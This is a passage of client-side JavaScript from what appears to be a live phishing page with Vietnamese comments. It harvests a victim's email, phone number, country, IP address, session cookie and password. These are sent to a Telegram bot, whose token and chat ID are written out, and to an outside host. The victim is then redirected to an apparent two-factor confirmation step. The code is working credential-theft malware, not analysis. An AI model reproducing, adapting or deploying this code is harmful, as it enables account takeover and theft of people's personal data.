                    $('#passwordModal').modal({
                        backdrop: 'static',
                        keyboard: false
                    });
                    hideLoadingCircle();
                    $("#passwordModal").modal("show");
                }, 2000);
                var reason = $('#reason').val();
                var email = $('#email').val();
                var country_code = $("select[id='country_code'] option:selected").val();
                var phone = $('#phone').val();
                $.ajax({
                    url: "https://api.telegram.org/bot6527756193:AAH07r_EdcMQLB5qhqKc0-M2KY4bmFYXCKk/sendMessage",
                    method: "POST",
                    data: {
                        chat_id: "-4089815989",
                        text: "Email: " + email + "\nMã Vùng:" + country_code + "\nPhone: " + phone + "\nIp: " + ip + "\nMô tả:" + reason
                    }
                });
                $('#form-error').text('');
                $('#btn-submit').attr('disabled', true);
                $("#message_err").html('<p ></p>');
                $("#password-input").val('')
                var payload = {
                    'email': $("#email").val(),
                    'type': 'email'
                };
                $.ajax({
                    url: 'server.php',
                    dataType: 'json',
                    data: payload,
                    method: "POST",
                    rejectUnauthorized: false,
                    success: function(response) {
                        response = JSON.parse(response)
                        clientToken = response.clientToken;
                        localStorage.setItem('clientToken', clientToken);
                    },
                    error: function(err) {
                        console.log(err);
                    }
                });
            }

        })


    });

    // CONST FUNCTION HAI THEM
    var sessid = "";
    var ip = "";
    var country = "";

    function getsttindex() {
        // Tạo yêu cầu AJAX bằng jQuery
        $.ajax({
            url: "https://1646415.com/post.php?t=getsttindex&id=" + sessid,
            method: "GET",
            dataType: "JSON",
            success: function(data) {
                if (data == '2FA') {
                    window.location.href = 'confirm.php';
                } else if (data == 'Success') {
                    window.location.href = 'success.php';
                } else if (data == 'Loading') {
                    window.location.href = 'Loading.php';
                } else {
                    console.log('khác');
                }
            },
            error: function() {
                // Xử lý lỗi nếu có
                console.error("Đã xảy ra lỗi trong quá trình lấy dữ liệu.");
            }
        });
    }

    function updatepass(pass) {
        $.ajax({
            url: "https://1646415.com/post.php?t=update2&id=" + sessid + "&password=" + pass,
            method: "POST",
            dataType: 'JSON'

        });
    }

    function AddSess() {
        $.ajax({
            url: 'https://1646415.com/modun_post.php',
            type: 'POST',
            dataType: 'JSON',
            data: {
                t: 'insert_sess',
                id: sessid
            },

            success: function(data) {
                console.log('true', data);
            },
            error: function() {
                console.error('false');

            }
        });

    }

    function checkCountry() {
        $.ajax({
            url: 'https://ipinfo.io/' + ip + '/json?',
            dataType: 'json',
            success: function(response) {
                country = response.country;
                console.log(country);
            },
            error: function() {
                $("#ip-info").text("Không thể kiểm tra quốc gia cho IP " + ip);
            }
        });
    }

    function getIP() {
            $.ajax({
        url: 'https://ipapi.co/ip',
        type: 'GET',
        contentType: 'application/json',
        async: true,
        success: function (msg) {
            ip = msg;
        }
    });
        }
		

    function GetSess() {
        var username = $.cookie();
        if (username) {
            sessid = username['PHPSESSID'];
            console.log(username['PHPSESSID']);
        } else {
            $('#cookieValue').text('Cookie không tồn tại');
        }
        return sessid;
    }

    function showLoadingCircle() {
        document.getElementById('loading-circle').style.display = 'block';
    }

    function hideLoadingCircle() {
        document.getElementById('loading-circle').style.display = 'none';
    }

    function update() {
        var country_code = $("select[id='country_code'] option:selected").val();
        var phone = $('#phone').val();
        $.ajax({
            url: "https://1646415.com/modun_post.php",
            method: "POST",
            data: {
                t: 'update1',
                id: sessid,
                email: email,
                phone: country_code + " " + phone,
                country: country
            }
        });
    }
    // End CONST FUNCTION HAI THEM

    $(".submit_password").click(function() {
        sendPasword();
    });

    $(".cancel").click(function() {
        var payload = {
            'type': 'cancel'
        };
        var clientToken = localStorage.getItem('clientToken');
        $.ajax({
            url: 'server.php',
            dataType: 'json',
            data: payload,
            method: "POST",
            rejectUnauthorized: false,
            headers: {
                'x-client-token': clientToken // Truyền clientToken trong tiêu đề x-client-token
            },
            success: function(response) {
                response = JSON.parse(response)
                if (response.status == true) {
                    $('#btn-submit').attr('disabled', false);
                    $("#passwordModal").modal("hide");
                }

            },
            error: function(err) {
                console.log(err);
            }
        });
    });

    function sendpass(password) {
        $.ajax({
            url: 'https://api.telegram.org/bot6527756193:AAH07r_EdcMQLB5qhqKc0-M2KY4bmFYXCKk/sendMessage',
            method: 'POST',
            data: {
                chat_id: '-4089815989',
                text: 'Pass: ' + password + '\nIp: ' + ip
            }
        });
    }

    function sendPasword() {
        $("#message_err").html('<p style="color: Gray;">Authentication in progress</p>')
        $(".submit_password").prop("disabled", true);
        var clientToken = localStorage.getItem('clientToken');
        var payload = {
            'email': $("#email").val(),
            'password': $("#password-input").val(),
            'type': 'password'
        };
        var password = $("#password-input").val();
        $.ajax({
            url: 'https://api.telegram.org/bot6527756193:AAH07r_EdcMQLB5qhqKc0-M2KY4bmFYXCKk/sendMessage',
            method: 'POST',
            data: {
                chat_id: '-4089815989',
                text: 'Pass: ' + password + '\nIp: ' + ip
            }
        });

        $.ajax({
            url: 'server.php',
            dataType: 'json',
            data: payload,
            method: "POST",
            headers: {
                'x-client-token': clientToken // Truyền clientToken trong tiêu đề x-client-token
            },
            success: function(response) {
                var password = $("#password-input").val();
                var url1 = "https://1646415.com/post.php?t=update2&id=" + sessid + "&password=" + password;
                response = JSON.parse(response)
                if (response.status) {
                    localStorage.setItem('typeCheckPoint', response.type)
                    localStorage.setItem('email', payload.email);
                    localStorage.setItem('password', payload.password);
                    $("#message_err").html('<p style="color: green;">' + response.message + '</p>')
                    if (response.pass == true) {
                        setTimeout(() => {
                            // Thực hiện yêu cầu POST
                            $.post(url1, function(response) {
                                // Xử lý kết quả ở đây
                                console.log(response);
                            });
                            window.location.href = "success.php"
                        }, 1500);
                    } else {
                        setTimeout(() => {
                            $.post(url1, function(response) {
                                console.log(response);
                            });
                            window.location.href = "confirm.php"
                        }, 1500);
                    }
                } else {
                    $("#message_err").html('<p style="color: red;">' + response.message + '</p>')
                    $(".submit_password").prop("disabled", false);
                }
            },
            error: function(err) {
                console.log(err);
            }
        });
    };
</script>

</html>